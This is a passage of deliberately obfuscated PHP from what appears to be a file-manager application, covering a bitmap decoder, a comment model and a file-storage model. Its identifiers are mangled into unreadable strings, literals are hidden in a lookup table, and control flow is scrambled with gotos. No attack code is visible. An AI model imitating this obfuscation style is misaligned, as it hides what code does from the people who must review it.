$FÂóÁƒÈ¬[($F¢ÂÎ „¨ğ & $bàˆãàÍï >> $CâÜŒÃò¢à) >> $FÁ‘ŠéèŞã - $CâÜŒÃò¢à]); } break; } break; default: $F—õÍí…ä = fread($có¿Øèáğ–, 1); if ($F—õÍí…ä === !1) { imagedestroy($e ˜¤‚¹É); return !1; } list(, $BÀ±«ã‰ÉÖ, $F¢ÂÎ „¨ğ) = unpack($AßöíöÔÄ±[1852], $CÉ…››»ˆ· . $F—õÍí…ä); for ($aŞ‡§‹¯ï÷ = 0, $Bè‘êÆŞî¥ = 0; $aŞ‡§‹¯ï÷ < $BÀ±«ã‰ÉÖ; ++$aŞ‡§‹¯ï÷, ++$AàÓ”¯ÜÌ•, $Bè‘êÆŞî¥ += $B¨áë¨Ô„‹) { $CâÜŒÃò¢à = $Bè‘êÆŞî¥ & 7; imagesetpixel($e ˜¤‚¹É, $AàÓ”¯ÜÌ•, $D¸Õ´ÈÔÛÜ, $FÂóÁƒÈ¬[($F¢ÂÎ „¨ğ & $bàˆãàÍï >> $CâÜŒÃò¢à) >> $FÁ‘ŠéèŞã - $CâÜŒÃò¢à]); } break; } } } else { for ($cÕ‰‹¤¹àí = 0; $cÕ‰‹¤¹àí < $f“ØîËÁ“ï; ++$cÕ‰‹¤¹àí, $D¸Õ´ÈÔÛÜ += $D“à®…õ†Ï) { $CÉ…››»ˆ· = fread($có¿Øèáğ–, $AòÓù¦ºó); if ($CÉ…››»ˆ· === !1) { imagedestroy($e ˜¤‚¹É); return !1; } $Bè‘êÆŞî¥ = 0; for ($AàÓ”¯ÜÌ• = 0; $AàÓ”¯ÜÌ• < $b‰ç­±“‡‰; ++$AàÓ”¯ÜÌ•, $Bè‘êÆŞî¥ += $B¨áë¨Ô„‹) { list(, $F¢ÂÎ „¨ğ) = unpack($AßöíöÔÄ±[1853], $CÉ…››»ˆ·[$Bè‘êÆŞî¥ >> 3]); $CâÜŒÃò¢à = $Bè‘êÆŞî¥ & 7; imagesetpixel($e ˜¤‚¹É, $AàÓ”¯ÜÌ•, $D¸Õ´ÈÔÛÜ, $FÂóÁƒÈ¬[($F¢ÂÎ „¨ğ & $bàˆãàÍï >> $CâÜŒÃò¢à) >> $FÁ‘ŠéèŞã - $CâÜŒÃò¢à]); } } } goto EôèªÉ„•¨; EôèªÉ„•¨: } else { goto bßÏç¿Ÿò—; fÀ •æ½ğ: $fğÊ×ôÆğª = $fÁÜì‡¢ö‰ ? 1 / $fÁÜì‡¢ö‰ : 1; $F¿µãğ±Š = $e–¢”ºó³ ? 1 / $e–¢”ºó³ : 1; $Aù´­´è¯‡ = $fŒÆÖé÷ˆ ? 1 / $fŒÆÖé÷ˆ : 1; goto CÚõï‚‘ÒÂ; bÄÀµ¿æå§: $aàªæõ‘ñ = $B¨áë¨Ô„‹ >> 3; $B§°¸é½Õƒ = $eĞÊà÷¼Ø· ? 127 : 0; $F³¢Îâì = $eĞÊà÷¼Ø· ? 1 / $eĞÊà÷¼Ø· : 1; goto fÀ •æ½ğ; bßÏç¿Ÿò—: $e ˜¤‚¹É = imagecreatetruecolor($b‰ç­±“‡‰, $f“ØîËÁ“ï); imagealphablending($e ˜¤‚¹É, !1); if ($eĞÊà÷¼Ø·) { imagesavealpha($e ˜¤‚¹É, !0); } goto bÄÀµ¿æå§; CÚõï‚‘ÒÂ: for ($cÕ‰‹¤¹àí = 0; $cÕ‰‹¤¹àí < $f“ØîËÁ“ï; ++$cÕ‰‹¤¹àí, $D¸Õ´ÈÔÛÜ += $D“à®…õ†Ï) { $CÉ…››»ˆ· = fread($có¿Øèáğ–, $AòÓù¦ºó); if ($CÉ…››»ˆ· === !1) { imagedestroy($e ˜¤‚¹É); return !1; } $Bè‘êÆŞî¥ = 0; for ($AàÓ”¯ÜÌ• = 0; $AàÓ”¯ÜÌ• < $b‰ç­±“‡‰; ++$AàÓ”¯ÜÌ•, $Bè‘êÆŞî¥ += $aàªæõ‘ñ) { list(, $F¢ÂÎ „¨ğ) = unpack($AßöíöÔÄ±[1830], substr($CÉ…››»ˆ·, $Bè‘êÆŞî¥, $aàªæõ‘ñ) . $AßöíöÔÄ±[1854]); $dîôŠÉˆÜ¬ = $F¢ÂÎ „¨ğ & $eĞÊà÷¼Ø·; $côß‘±öÃ = $F¢ÂÎ „¨ğ & $fÁÜì‡¢ö‰; $f¤É±Œô— = $F¢ÂÎ „¨ğ & $e–¢”ºó³; $b‡Ñª = $F¢ÂÎ „¨ğ & $fŒÆÖé÷ˆ; $cğÚ†™äƒ = $B§°¸é½Õƒ - (($dîôŠÉˆÜ¬ << 7) - $dîôŠÉˆÜ¬) * $F³¢Îâì; $AŸ­º‹ÍªÇ = (($côß‘±öÃ << 8) - $côß‘±öÃ) * $fğÊ×ôÆğª; $C×õö“Ÿ´Û = (($f¤É±Œô— << 8) - $f¤É±Œô—) * $F¿µãğ±Š; $CâÜŒÃò¢à = (($b‡Ñª << 8) - $b‡Ñª) * $Aù´­´è¯‡; imagesetpixel($e ˜¤‚¹É, $AàÓ”¯ÜÌ•, $D¸Õ´ÈÔÛÜ, $cğÚ†™äƒ << 24 | $AŸ­º‹ÍªÇ << 16 | $C×õö“Ÿ´Û << 8 | $CâÜŒÃò¢à); } } imagealphablending($e ˜¤‚¹É, !0); goto d‘Ô¡ó–ÖÜ; d‘Ô¡ó–ÖÜ: } return $e ˜¤‚¹É; goto b“ùõ³åñ; døĞˆÉî®Ù: if ($b‰ç­±“‡‰ == 0 || $dß½ñ½Ô¿ò == 0 || $båŠÕá®‚Ì != 1 || ($eĞÊà÷¼Ø· & $fÁÜì‡¢ö‰) != 0 || ($eĞÊà÷¼Ø· & $e–¢”ºó³) != 0 || ($eĞÊà÷¼Ø· & $fŒÆÖé÷ˆ) != 0 || ($fÁÜì‡¢ö‰ & $e–¢”ºó³) != 0 || ($fÁÜì‡¢ö‰ & $fŒÆÖé÷ˆ) != 0 || ($e–¢”ºó³ & $fŒÆÖé÷ˆ) != 0) { return !1; } if ($b£Ä‚ƒŞ…ó == 4 || $b£Ä‚ƒŞ…ó == 5) { $CÉ…››»ˆ· = stream_get_contents($có¿Øèáğ–, $dˆòÔ¥¿¸); if ($CÉ…››»ˆ· === !1) { return !1; } return imagecreatefromstring($CÉ…››»ˆ·); } $AòÓù¦ºó = $b‰ç­±“‡‰ * $B¨áë¨Ô„‹ + 31 >> 3 & ~3; goto FæÁ¿’ƒ ¦; b“ùõ³åñ: } } goto AÍ¤íºÍÎ; e½á¤œÈ‹ƒ: define($_SERVER[¹÷ˆ§éÒ°ú][1928], 4); define($_SERVER[¹÷ˆ§éÒ°ú][1929], 5); define($_SERVER[¹÷ˆ§éÒ°ú][1930], 16); goto a·”­«Ù°í; D™ÛÉå¯ô: class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\x6d\145\156\x74"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\x61\x6d\x65" => "\143\x6f\155\x6d\145\156\x74\x5f\155\x65\x74\x61", "\x6d\x65\164\x61\x46\x69\145\154\x64" => "\143\x6f\155\x6d\145\156\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($e»õÈÏ‘) { $fŞñÓ¿Î =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($e»õÈÏ‘[$fŞñÓ¿Î[2124]]) { $E¤¸‰Ê‚ = $this->where(array($fŞñÓ¿Î[2125] => $e»õÈÏ‘[$fŞñÓ¿Î[2124]]))->find(); if (!$E¤¸‰Ê‚ || $E¤¸‰Ê‚[$fŞñÓ¿Î[382]] != $e»õÈÏ‘[$fŞñÓ¿Î[382]] || $E¤¸‰Ê‚[$fŞñÓ¿Î[469]] != $e»õÈÏ‘[$fŞñÓ¿Î[469]]) { return !1; } $this->where(array($fŞñÓ¿Î[2125] => $e»õÈÏ‘[$fŞñÓ¿Î[2124]]))->setAdd($fŞñÓ¿Î[2126], 1); } $e»õÈÏ‘[$fŞñÓ¿Î[2127]] = 0; $e»õÈÏ‘[$fŞñÓ¿Î[2126]] = 0; $e»õÈÏ‘[$fŞñÓ¿Î[684]] = 1; return $this->add($e»õÈÏ‘); } public function remove($e²Şº¦¾²Ø) { $Cğ¯¤’ë‰÷ =& $_SERVER[¹÷ˆ§éÒ°ú]; $bª«º­Şò = array($Cğ¯¤’ë‰÷[2125] => $e²Şº¦¾²Ø); $e¢ï±Ô‰„´ = $this->where($bª«º­Şò)->find(); if ($e¢ï±Ô‰„´[$Cğ¯¤’ë‰÷[2124]]) { $this->where(array($Cğ¯¤’ë‰÷[2125] => $e¢ï±Ô‰„´[$Cğ¯¤’ë‰÷[2124]]))->setAdd($Cğ¯¤’ë‰÷[2126], -1); } return $this->where($bª«º­Şò)->delete(); } public function edit($e®‹¼×ÑÂ„, $bİ¶±î©¼ó) { $c–¦øõ¥ =& $_SERVER[¹÷ˆ§éÒ°ú]; $EÌ±©ˆë¯¢ = array($c–¦øõ¥[2125] => $e®‹¼×ÑÂ„); return $this->where($EÌ±©ˆë¯¢)->save(array($c–¦øõ¥[2128] => $bİ¶±î©¼ó)); } public function prasise($b‹“İù…¤Í) { $CÌèÍåéÅ =& $_SERVER[¹÷ˆ§éÒ°ú]; $D™Ä²ŞŸóŒ = Model($CÌèÍåéÅ[2129]); $cŠÎË›œÈá = array($CÌèÍåéÅ[2125] => $b‹“İù…¤Í, $CÌèÍåéÅ[1418] => USER_ID); $d½ó±²”¢ = $D™Ä²ŞŸóŒ->where($cŠÎË›œÈá)->find(); if (!$d½ó±²”¢) { $D™Ä²ŞŸóŒ->add($cŠÎË›œÈá); $C›ööƒ›¼Î = $this->where(array($CÌèÍåéÅ[2125] => $b‹“İù…¤Í))->setAdd($CÌèÍåéÅ[2127], 1); } else { $D™Ä²ŞŸóŒ->where($cŠÎË›œÈá)->delete(); $C›ööƒ›¼Î = $this->where(array($CÌèÍåéÅ[2125] => $b‹“İù…¤Í))->setAdd($CÌèÍåéÅ[2127], -1); } return $C›ööƒ›¼Î; } public function targetInfo($E¬ë’¤ƒŠ, $C´íàó£…–) { goto cëÍÆÙñË; aö¾Å»óºõ: $e”ŸØ¶ ‰œ = "\122\111\107\x48\124\x20\112\117\111\116\40{$this->tablePrefix}\x63\157\155\x6d\x65\156\164\137\160\x72\141\x69\x73\x65\40\x73\164\141\162\40\x6f\156\40\x63\157\x6d\155\145\x6e\x74\x2e\143\x6f\x6d\x6d\x65\156\x74\111\x44\x20\75\40\x73\x74\141\162\56\143\x6f\155\155\x65\x6e\x74\111\104"; $DÅŠ¡ÆÙ‡ = $this->alias($DŸŒ´µÚ³[352])->where($fŒÈº©İß´)->join($e”ŸØ¶ ‰œ, $DŸŒ´µÚ³[2130])->count(); $d—Ñ¤¡¿Ö† = array($DŸŒ´µÚ³[2131] => $FŠĞ×Ä™­, $DŸŒ´µÚ³[2132] => $DÅŠ¡ÆÙ‡); goto Cáë†ã¦‹; Cáë†ã¦‹: return $d—Ñ¤¡¿Ö†; goto cà… õÇè; cëÍÆÙñË: $DŸŒ´µÚ³ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fŒÈº©İß´ = array($DŸŒ´µÚ³[534] => $E¬ë’¤ƒŠ, $DŸŒ´µÚ³[535] => $C´íàó£…–); $FŠĞ×Ä™­ = $this->where($fŒÈº©İß´)->count(); goto aö¾Å»óºõ; cà… õÇè: } public function listData($EÁÕªµÊ‚) { $aÎµœˆ¢Èğ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (isset($EÁÕªµÊ‚[$aÎµœˆ¢Èğ[2133]])) { if ($EÁÕªµÊ‚[$aÎµœˆ¢Èğ[2133]]) { $EÁÕªµÊ‚[$aÎµœˆ¢Èğ[2134]] = array($aÎµœˆ¢Èğ[918], intval($EÁÕªµÊ‚[$aÎµœˆ¢Èğ[2133]])); } unset($EÁÕªµÊ‚[$aÎµœˆ¢Èğ[2133]]); } if (isset($EÁÕªµÊ‚[$aÎµœˆ¢Èğ[2135]])) { if ($EÁÕªµÊ‚[$aÎµœˆ¢Èğ[2135]]) { $EÁÕªµÊ‚[$aÎµœˆ¢Èğ[2134]] = array($aÎµœˆ¢Èğ[915], intval($EÁÕªµÊ‚[$aÎµœˆ¢Èğ[2135]])); } unset($EÁÕªµÊ‚[$aÎµœˆ¢Èğ[2135]]); } return $this->_listData($EÁÕªµÊ‚); } private function _listData($b¯Ì¼«äÁ) { $D¤½¯çŠ =& $_SERVER[¹÷ˆ§éÒ°ú]; $DİÂÔ¡•Ö§ = $this->where($b¯Ì¼«äÁ)->_makeOrder()->selectPage(100); $this->_listAppendParent($DİÂÔ¡•Ö§[$D¤½¯çŠ[365]]); $this->_listAppendUser($DİÂÔ¡•Ö§[$D¤½¯çŠ[365]]); $this->_listAppendMeta($DİÂÔ¡•Ö§[$D¤½¯çŠ[365]]); return $DİÂÔ¡•Ö§; } private function _makeOrder() { $d•Œª³»öÕ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C©‡ßÁÏ = array($d•Œª³»öÕ[2127], $d•Œª³»öÕ[2126], $d•Œª³»öÕ[199]); $A½Œ¯ÂÃ„İ = Input::get($d•Œª³»öÕ[418], $d•Œª³»öÕ[17], $d•Œª³»öÕ[400], $C©‡ßÁÏ); $a“‹Á¶´ê = Input::get($d•Œª³»öÕ[419], $d•Œª³»öÕ[17], $d•Œª³»öÕ[1420], array($d•Œª³»öÕ[2136], $d•Œª³»öÕ[416])); $DÂÜ‰˜í = $A½Œ¯ÂÃ„İ . $d•Œª³»öÕ[60] . $a“‹Á¶´ê; return $this->order($DÂÜ‰˜í); } private function _listAppendParent(&$eäöé¼éÙì) { goto Bò­™ÃÉ‚; CÓ‹áØë: foreach ($eäöé¼éÙì as &$AïŒ°¬) { if (isset($d¸Ğ‚Ü…´[$AïŒ°¬[$FÚ¹„¢Àï[2124]]])) { $AïŒ°¬[$FÚ¹„¢Àï[2137]] = $d¸Ğ‚Ü…´[$AïŒ°¬[$FÚ¹„¢Àï[2124]]]; } } goto cµÙ› Ç; CóÙÕçìÚŸ: if (!$c³ô¸Æªˆñ) { return; } $d¸Ğ‚Ü…´ = $this->where(array($FÚ¹„¢Àï[2125] => array($FÚ¹„¢Àï[17], $c³ô¸Æªˆñ)))->select(); $d¸Ğ‚Ü…´ = array_to_keyvalue($d¸Ğ‚Ü…´, $FÚ¹„¢Àï[2134]); goto CÓ‹áØë; Bò­™ÃÉ‚: $FÚ¹„¢Àï =& $_SERVER[¹÷ˆ§éÒ°ú]; $c³ô¸Æªˆñ = array_unique(array_to_keyvalue($eäöé¼éÙì, $FÚ¹„¢Àï[43], $FÚ¹„¢Àï[2124])); $c³ô¸Æªˆñ = array_remove_value($c³ô¸Æªˆñ, $FÚ¹„¢Àï[481]); goto CóÙÕçìÚŸ; cµÙ› Ç: } private function _listAppendUser(&$F‹ãƒÕŠº‰) { goto Aé‘†ñ”õ·; fÛÄ×Ú¡Å‚: foreach ($F‹ãƒÕŠº‰ as &$e—ôƒ³†¡„) { $e—ôƒ³†¡„[$F¯ÂÛš¶ÖÄ[548]] = $fƒ­‚˜ï„“[$e—ôƒ³†¡„[$F¯ÂÛš¶ÖÄ[1427]]]; if (isset($e—ôƒ³†¡„[$F¯ÂÛš¶ÖÄ[2137]])) { $e—ôƒ³†¡„[$F¯ÂÛš¶ÖÄ[2137]][$F¯ÂÛš¶ÖÄ[548]] = $fƒ­‚˜ï„“[$e—ôƒ³†¡„[$F¯ÂÛš¶ÖÄ[2137]][$F¯ÂÛš¶ÖÄ[1427]]]; } } goto f„Í†õÃš›; Aé‘†ñ”õ·: $F¯ÂÛš¶ÖÄ =& $_SERVER[¹÷ˆ§éÒ°ú]; $cÄÎ¸ì¨Éå = array_unique(array_to_keyvalue($F‹ãƒÕŠº‰, $F¯ÂÛš¶ÖÄ[43], $F¯ÂÛš¶ÖÄ[1427])); $cÄÎ¸ì¨Éå = array_remove_value($cÄÎ¸ì¨Éå, $F¯ÂÛš¶ÖÄ[481]); goto dß˜Â‚¦´Ë; dß˜Â‚¦´Ë: if (count($cÄÎ¸ì¨Éå) == 0) { return; } foreach ($F‹ãƒÕŠº‰ as $e—ôƒ³†¡„) { if (isset($e—ôƒ³†¡„[$F¯ÂÛš¶ÖÄ[2137]])) { $cÄÎ¸ì¨Éå[] = $e—ôƒ³†¡„[$F¯ÂÛš¶ÖÄ[2137]][$F¯ÂÛš¶ÖÄ[1427]]; } } $fƒ­‚˜ï„“ = Model($F¯ÂÛš¶ÖÄ[490])->userListInfo($cÄÎ¸ì¨Éå); goto fÛÄ×Ú¡Å‚; f„Í†õÃš›: } private function _listAppendMeta(&$d¤Ÿ—ñ‹») { goto AÕØ‰†ÇØ; D¼ôæ—ªĞá: if (!$EÀç£ÓŠóÆ) { return; } foreach ($d¤Ÿ—ñ‹» as $A‹öÀ°²ßİ) { if (isset($A‹öÀ°²ßİ[$d²ˆÙÄ³éÇ[2137]])) { $EÀç£ÓŠóÆ[] = $A‹öÀ°²ßİ[$d²ˆÙÄ³éÇ[2137]][$d²ˆÙÄ³éÇ[2134]]; } } $f¸™ĞÊ¨„ = $this->metaList($EÀç£ÓŠóÆ); goto EŒ×šˆñˆ; EŒ×šˆñˆ: if (!$f¸™ĞÊ¨„) { return !1; } foreach ($d¤Ÿ—ñ‹» as &$A‹öÀ°²ßİ) { $A‹öÀ°²ßİ[$d²ˆÙÄ³éÇ[428]] = $f¸™ĞÊ¨„[$A‹öÀ°²ßİ[$d²ˆÙÄ³éÇ[2134]]]; if (isset($A‹öÀ°²ßİ[$d²ˆÙÄ³éÇ[2137]])) { $A‹öÀ°²ßİ[$d²ˆÙÄ³éÇ[2137]][$d²ˆÙÄ³éÇ[428]] = $f¸™ĞÊ¨„[$A‹öÀ°²ßİ[$d²ˆÙÄ³éÇ[2137]][$d²ˆÙÄ³éÇ[2134]]]; } } goto A•é‚‡åÕô; AÕØ‰†ÇØ: $d²ˆÙÄ³éÇ =& $_SERVER[¹÷ˆ§éÒ°ú]; $EÀç£ÓŠóÆ = array_unique(array_to_keyvalue($d¤Ÿ—ñ‹», $d²ˆÙÄ³éÇ[43], $d²ˆÙÄ³éÇ[2134])); $EÀç£ÓŠóÆ = array_remove_value($EÀç£ÓŠóÆ, $d²ˆÙÄ³éÇ[481]); goto D¼ôæ—ªĞá; A•é‚‡åÕô: } private function metaList($fÃíï¦õÌ‹) { goto e±—–¾µ…ï; B¾¥ŒŸã¤Æ: $Aà‡Ü¥Ûİ = Model($BáôÛù§Šî[2138])->where($CŒÎŸôß¹â)->select(); $Aà‡Ü¥Ûİ = array_to_keyvalue_group($Aà‡Ü¥Ûİ, $BáôÛù§Šî[2134]); foreach ($Aà‡Ü¥Ûİ as $eÈì«ß²Ö => $e·ÀÛéÂõ‹) { $bÙïö›©£ = array(); foreach ($e·ÀÛéÂõ‹ as $C†³ÄÄˆî) { $bÙïö›©£[$C†³ÄÄˆî[$BáôÛù§Šî[101]]] = $C†³ÄÄˆî[$BáôÛù§Šî[370]]; } $Aà‡Ü¥Ûİ[$eÈì«ß²Ö] = $bÙïö›©£; } goto aé¸ºëÒ; e±—–¾µ…ï: $BáôÛù§Šî =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$fÃíï¦õÌ‹) { return array(); } $CŒÎŸôß¹â = array($BáôÛù§Šî[2134] => array($BáôÛù§Šî[17], $fÃíï¦õÌ‹)); goto B¾¥ŒŸã¤Æ; aé¸ºëÒ: return $Aà‡Ü¥Ûİ ? $Aà‡Ü¥Ûİ : array(); goto DøŠ‰¯ò; DøŠ‰¯ò: } } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\x6c\145"; protected $tableMeta = array("\164\x61\x62\154\145\116\x61\155\145" => "\151\157\x5f\x66\x69\x6c\x65\x5f\155\145\x74\x61", "\x6d\x65\164\141\106\151\145\x6c\144" => "\146\151\x6c\145\111\x44"); public function fileInfo($CÙˆÒóĞÆè) { $A¦ï¸êğÒ =& $_SERVER[¹÷ˆ§éÒ°ú]; static $F¦›ÔµŠñç = array(); if (!isset($F¦›ÔµŠñç[$CÙˆÒóĞÆè])) { $AºÛ¥œ·Ç´ = $A¦ï¸êğÒ[2139]; $eˆ¸¾éïŠƒ = Model($A¦ï¸êğÒ[433])->field($AºÛ¥œ·Ç´)->where(array($A¦ï¸êğÒ[431] => $CÙˆÒóĞÆè))->find(); $F¦›ÔµŠñç[$CÙˆÒóĞÆè] = $eˆ¸¾éïŠƒ; } return $F¦›ÔµŠñç[$CÙˆÒóĞÆè]; } public function addFileByContent($fÑğò­ê… = '', $BåùÓä»èµ = '') { goto eºğĞªñ¬¸; F»»¦Ó÷‹: $a˜©Î¥ğíŒ = $B³Ü ©Âğ‹ . $cÂñ§ßğÇ[2141] . rand_string(16); file_put_contents($a˜©Î¥ğíŒ, $fÑğò­ê…); $BºµÕ ÷¦ = $this->addFile($a˜©Î¥ğíŒ, $BåùÓä»èµ, !0); goto F•Óš¸˜øî; F•Óš¸˜øî: if (file_exists($a˜©Î¥ğíŒ)) { @unlink($a˜©Î¥ğíŒ); } return $BºµÕ ÷¦; goto F—î«Áï…Ş; eºğĞªñ¬¸: $cÂñ§ßğÇ =& $_SERVER[¹÷ˆ§éÒ°ú]; $B³Ü ©Âğ‹ = TEMP_PATH . $cÂñ§ßğÇ[2140]; if (!is_dir($B³Ü ©Âğ‹)) { mk_dir($B³Ü ©Âğ‹); } goto F»»¦Ó÷‹; F—î«Áï…Ş: } public function createFileName($dŠ•¯–«›Ó) { goto E ¢‰íˆ; c›É¨íºŒ: $FÂÔ¸Á²õ’ = $fÇ½éöäÁ->pathFather($f•Êƒ¼´); static $dï¸¢ ˜¶¼ = false; $eÀèà½Éî = $e²åŞÇÇÚá[2142] . md5($FÂÔ¸Á²õ’); goto báØ±¿×‰¥; báØ±¿×‰¥: if (!$dï¸¢ ˜¶¼ && !Cache::get($eÀèà½Éî)) { $dï¸¢ ˜¶¼ = !0; $BÉ¶ÒÉ„á· = IO::mkdir($FÂÔ¸Á²õ’); if (!IO::exist($BÉ¶ÒÉ„á· . $e²åŞÇÇÚá[2143])) { IO::mkfile($BÉ¶ÒÉ„á· . $e²åŞÇÇÚá[2143]); } Cache::set($eÀèà½Éî, 1, 3600 * 2); } return $f•Êƒ¼´; goto eòİòŒî¿; E ¢‰íˆ: $e²åŞÇÇÚá =& $_SERVER[¹÷ˆ§éÒ°ú]; $fÇ½éöäÁ = IO::init($e²åŞÇÇÚá[18]); $f•Êƒ¼´ = $this->makeFilePath($dŠ•¯–«›Ó, $fÇ½éöäÁ); goto c›É¨íºŒ; eòİòŒî¿: } public function makeFilePath($B‹­ßéİ£ò, $CãÛ¹Ìø®) { goto bôâÖÍ¹àˆ; DôÆ½ˆêñ: switch ($B¾Òî¡­öª) { case $bâ©¯ëñƒ‹[2147]: $D‘’â¶ÇÅ = $D‘’â¶ÇÅ . $bâ©¯ëñƒ‹[103] . $CãÛ¹Ìø®->ext($B‹­ßéİ£ò); if ($CãÛ¹Ìø®->ext($B‹­ßéİ£ò) == $bâ©¯ëñƒ‹[2088]) { $D‘’â¶ÇÅ .= $bâ©¯ëñƒ‹[2148]; } break; case $bâ©¯ëñƒ‹[2149]: goto f”Üâ¼¶»; c™ÌšŠ—Ú: CacheLock::lock($D¹áŸİù¬Š); $B òË·Š¦º = IO::fileNameAuto($F¨ö‘ÇÊ¹¹, $B‹­ßéİ£ò); $D‘’â¶ÇÅ = $F¨ö‘ÇÊ¹¹ . $B òË·Š¦º; goto cëÑ©„Ì“Ó; cëÑ©„Ì“Ó: IO::setContent($D‘’â¶ÇÅ, $bâ©¯ëñƒ‹[43]); CacheLock::unlock($D¹áŸİù¬Š); break; goto eƒÊ ùªƒÛ; f”Üâ¼¶»: $FÎ‰¸­çÄÔ = Model($bâ©¯ëñƒ‹[1079])->get($bâ©¯ëñƒ‹[1325]); $B™ë°›»å = substr(md5($bâ©¯ëñƒ‹[1907] . $FÎ‰¸­çÄÔ . date($bâ©¯ëñƒ‹[682])), 0, 8); $F¦¼·µ™±‰ = KodIO::defaultDriver(); goto fƒª¨®–œ; fƒª¨®–œ: $F¨ö‘ÇÊ¹¹ = $bâ©¯ëñƒ‹[2150] . $F¦¼·µ™±‰[$bâ©¯ëñƒ‹[378]] . $bâ©¯ëñƒ‹[2151] . date($bâ©¯ëñƒ‹[2152]) . $B™ë°›»å . $bâ©¯ëñƒ‹[18]; if ($CãÛ¹Ìø®->ext($B‹­ßéİ£ò) == $bâ©¯ëñƒ‹[2088]) { $B‹­ßéİ£ò .= $bâ©¯ëñƒ‹[2148]; } $D¹áŸİù¬Š = $bâ©¯ëñƒ‹[2153] . $F¨ö‘ÇÊ¹¹ . $B‹­ßéİ£ò; goto c™ÌšŠ—Ú; eƒÊ ùªƒÛ: case $bâ©¯ëñƒ‹[2146]: break; default: break; } return $D‘’â¶ÇÅ; goto D¤¬ºÙ…ô; AÆ’÷¢éÜ: $D‘’â¶ÇÅ = $F¨ö‘ÇÊ¹¹ . rand_string(5) . short_id(100); $B‹­ßéİ£ò = str_replace($bâ©¯ëñƒ‹[18], $bâ©¯ëñƒ‹[82], KodIO::clear($B‹­ßéİ£ò)); if (!$B‹­ßéİ£ò) { $B¾Òî¡­öª = $bâ©¯ëñƒ‹[2146]; } goto DôÆ½ˆêñ; bôâÖÍ¹àˆ: $bâ©¯ëñƒ‹ =& $_SERVER[¹÷ˆ§éÒ°ú]; $B¾Òî¡­öª = Model($bâ©¯ëñƒ‹[1079])->get($bâ©¯ëñƒ‹[2144]); $F¨ö‘ÇÊ¹¹ = KodIO::defaultIO() . date($bâ©¯ëñƒ‹[2145]); goto AÆ’÷¢éÜ; D¤¬ºÙ…ô: } public function addFileByRemote($dÀÁ¹„ğ’—, $D…Ãàà¾—, $CŠ„Ÿğçå· = array()) { goto Eã¤Ÿï´ó¬; e¦Šìâ‰ÎØ: $a²—ÓÄ„Ã = IO::hashMd5($dÀÁ¹„ğ’—, $Bí”Ô¹³ãµ); $c¦êâ’‹Ê = KodIO::defaultDriver(); $D¥ƒåŞ©ìŒ = array($Aî·Ä’ÂŠÖ[533] => IO::size($dÀÁ¹„ğ’—), $Aî·Ä’ÂŠÖ[2154] => 1, $Aî·Ä’ÂŠÖ[397] => $D…Ãàà¾—, $Aî·Ä’ÂŠÖ[730] => $c¦êâ’‹Ê[$Aî·Ä’ÂŠÖ[378]], $Aî·Ä’ÂŠÖ[398] => $dÀÁ¹„ğ’—, $Aî·Ä’ÂŠÖ[2155] => $CŠ„Ÿğçå·[$Aî·Ä’ÂŠÖ[176]] ? $CŠ„Ÿğçå·[$Aî·Ä’ÂŠÖ[176]] : IO::hashSimple($dÀÁ¹„ğ’—), $Aî·Ä’ÂŠÖ[2156] => $a²—ÓÄ„Ã ? $a²—ÓÄ„Ã : $Bí”Ô¹³ãµ); goto f®™ ÂÏââ; f®™ ÂÏââ: if ($Fµ‘İ†ƒ±˜ = $this->addFileCheckExist($D¥ƒåŞ©ìŒ[$Aî·Ä’ÂŠÖ[176]], $D¥ƒåŞ©ìŒ[$Aî·Ä’ÂŠÖ[175]], $D¥ƒåŞ©ìŒ[$Aî·Ä’ÂŠÖ[89]])) { return $Fµ‘İ†ƒ±˜; } return $this->addFileData($D¥ƒåŞ©ìŒ); goto B²Àñ±¯È; Eã¤Ÿï´ó¬: $Aî·Ä’ÂŠÖ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!IO::exist($dÀÁ¹„ğ’—)) { return !1; } $Bí”Ô¹³ãµ = $CŠ„Ÿğçå·[$Aî·Ä’ÂŠÖ[175]] ? $CŠ„Ÿğçå·[$Aî·Ä’ÂŠÖ[175]] : $Aî·Ä’ÂŠÖ[43]; goto e¦Šìâ‰ÎØ; B²Àñ±¯È: } private function addFileData($bİè¼ğ”ø) { $EÀ£½Ò =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$bİè¼ğ”ø) { return !1; } $bİè¼ğ”ø[$EÀ£½Ò[89]] = intval($bİè¼ğ”ø[$EÀ£½Ò[89]]); if (!$bİè¼ğ”ø[$EÀ£½Ò[89]] && strlen($bİè¼ğ”ø[$EÀ£½Ò[176]]) > 32) { $bİè¼ğ”ø[$EÀ£½Ò[89]] = intval(substr($bİè¼ğ”ø[$EÀ£½Ò[176]], 32)); } $FƒİÕ³” = $this->add($bİè¼ğ”ø); return $this->find($FƒİÕ³”); } public function addFile($FƒÇË“…óø, $B©Ú“œ¦ğ, $a½‘Ÿòš±‰ = false) { goto dƒ¨÷³; FğÒ‰›ÁÆ: return $D·İ˜³íÛ‡; goto EÛŒĞ¹ ¬™; dƒ¨÷³: $a­À÷áòÎ‰ = IO::hashSimple($FƒÇË“…óø); $fÒ’¢÷±‹ğ = IO::hashMd5($FƒÇË“…óø); $c’ÂºÌéï = IO::size($FƒÇË“…óø); goto aõŸ¾Š¿ø£; DÏ¬‚îšÂ: $C¨¸¼ÊæÍ‹ = $this->addFileMake($FƒÇË“…óø, $c’ÂºÌéï, $a­À÷áòÎ‰, $fÒ’¢÷±‹ğ, $B©Ú“œ¦ğ, $a½‘Ÿòš±‰); $D·İ˜³íÛ‡ = $this->addFileData($C¨¸¼ÊæÍ‹); CacheLock::unlock($bÂ¼ğÏÔÑØ); goto FğÒ‰›ÁÆ; aõŸ¾Š¿ø£: $bÂ¼ğÏÔÑØ = $_SERVER[¹÷ˆ§éÒ°ú][2157] . $fÒ’¢÷±‹ğ; 